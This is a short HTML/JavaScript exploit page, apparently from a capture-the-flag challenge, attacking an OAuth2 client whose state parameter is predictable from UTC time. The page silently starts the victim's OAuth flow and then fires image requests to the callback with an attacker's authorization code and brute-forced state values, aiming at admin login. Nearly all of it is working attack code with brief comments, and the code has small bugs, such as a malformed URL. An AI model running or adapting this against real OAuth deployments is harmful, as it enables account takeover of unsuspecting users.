<!-- Basically, the global context is a CTF where the goal is to login as admin in an app by exploiting a bad implementation of OAuth2-->
<!-- After noticing that the values for the State parameter are based on the UTC time, i made the following script to exploit that bug-->


<!-- this starts the OAuth dance to make sure the victim has a state in the session -->
<img src="http://oauth_client.com/signinwithoauth" />


<!--  the following script brute forces the state parameter for 2 minutes worth of time -->
<script>
const url="http:/oauth_client.com/callback?code="

//  a code generated by an OAuth flow started by the hacker account
const code="4e5bc8982d325f1d2640ac1f8a63b2c6f0eda628d1d277bd3bab9a0699be0e85";
var d=new Date();
const base_state="20220917"+f(d.getUTCHours());
				  
function f(i){
	return i.toString().padStart(2,"0");
}
function attack(state){
	setTimeout(function(){document.write('<img src="'+url+code+'&state='+state+'"/><br/>');},2000)
}

for(minute=0; minute<=1;minute++){
	for(second=0; second<=59;second++){
	state=base_state+f(d.getUTCMinutes()+minute)+f(d.getUTCSeconds()+second);
	attack(state);
}
}

</script>


<!--  hopefully, the valid state was found and we would have admin access on the OAuth2 client by doing "sign in with OAuth" -->
